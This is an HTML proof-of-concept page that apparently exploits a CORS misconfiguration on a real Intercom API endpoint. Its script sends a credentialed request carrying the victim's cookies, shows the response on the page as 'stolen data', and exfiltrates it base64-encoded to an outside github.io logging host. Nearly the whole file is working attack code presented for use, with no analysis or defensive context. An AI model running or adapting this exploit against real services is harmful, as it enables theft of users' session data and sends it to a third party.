<!DOCTYPE html>
<html>
<head>
  <title>Intercom CORS Exploit PoC</title>
</head>
<body>
  <h1>Testing CORS Misconfiguration on Intercom</h1>
  <pre id="output">Waiting for response...</pre>

  <script>
    // Endpoint being abused
    const url = "https://api-iam.intercom.io/messenger/web/ping";

    // Example POST body (minimal app_id to trigger JSON response)
    const body = "app_id=zlmaz2pu&v=3";

    fetch(url, {
      method: "POST",
      credentials: "include",   // include victim's cookies/session
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: body
    })
    .then(r => r.text())
    .then(d => {
      // Show stolen data in browser
      document.getElementById("output").innerText = d;

      // Exfiltrate to your GitHub server logs or another domain you control
      fetch("https://russianyandexshop.github.io/view/log?data=" + btoa(d));
    })
    .catch(e => {
      document.getElementById("output").innerText = "Error: " + e;
    });
  </script>
</body>
</html>
